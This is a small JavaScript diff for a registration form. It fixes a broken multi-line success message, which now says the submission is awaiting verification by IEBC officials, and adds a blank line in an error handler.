@@ -741,6 +741,7 @@
           }
         }
       } catch (error) {
+      
         console.error('Error continuing registration:', error);
         showPreVerifyScreen();
       }
@@ -884,10 +885,8 @@ loginForm.addEventListener('submit', async (e) => {
         
         // Save to localStorage
         savePreVerifyData(nationalId, yearOfBirth);
+        msg.textContent = 'Submitted for verification by IEBC officials. You will be redirected when approved. This may take time due to traffic. Thanks for your time.';
         
-        msg.textContent = 'Submitted for verification IEBC officials. You will be redirected when approved. Your data is secured.
-        May take time due to traffic 
-        thanks for your Time';
         msg.className = 'message success';
         msg.style.display = 'block';
         
